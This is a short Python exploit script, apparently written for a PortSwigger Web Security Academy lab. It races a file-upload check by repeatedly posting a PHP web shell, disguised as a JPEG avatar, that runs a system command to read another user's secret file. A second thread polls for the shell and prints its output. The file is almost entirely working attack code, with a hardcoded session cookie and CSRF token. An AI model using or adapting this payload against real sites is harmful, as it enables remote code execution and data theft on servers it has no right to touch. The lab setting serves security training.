#! /env/bin/python3

import requests
import threading
import time

FOUND=False

def do_upload():
    print("[+] Send payload!")
    session = requests.session()
    
    url = "https://0afb009f0416a3668200f7f8005800fe.web-security-academy.net:443/my-account/avatar"
    cookies = {"session": "4bxu83aEXxPP49uH4LWTD35PkflWkmq7"}
    headers = {"Content-Type": "multipart/form-data; boundary=---------------------------2344655043150535419923437261"}
    data = "-----------------------------2344655043150535419923437261\r\nContent-Disposition: form-data; name=\"avatar\"; filename=\"reverse.php\"\r\nContent-Type: image/jpeg\r\n\r\n<?= system('cat /home/carlos/secret') ?>\r\n-----------------------------2344655043150535419923437261\r\nContent-Disposition: form-data; name=\"user\"\r\n\r\nwiener\r\n-----------------------------2344655043150535419923437261\r\nContent-Disposition: form-data; name=\"csrf\"\r\n\r\nlxr2OeKsOtFat5u3eZexweHm366BjExs\r\n-----------------------------2344655043150535419923437261--\r\n"
    # response = session.post(url, headers=headers, cookies=cookies, data=data, verify=False, proxies={"https":"http://localhost:8080"})
    response = session.post(url, headers=headers, cookies=cookies, data=data)
    # print(response.status_code)

def do_check():
    global FOUND
    response = requests.get("https://0afb009f0416a3668200f7f8005800fe.web-security-academy.net/files/avatars/reverse.php")
    print(response.status_code)
    while not FOUND:
        if response.status_code == 200:
            print(response.content.decode('utf-8'))
            FOUND = True
            break
        # time.sleep(0.1)


if __name__ == '__main__':
    threading.Thread(target=do_check).start()
    while not FOUND:
        do_upload()
        time.sleep(0.2)
            

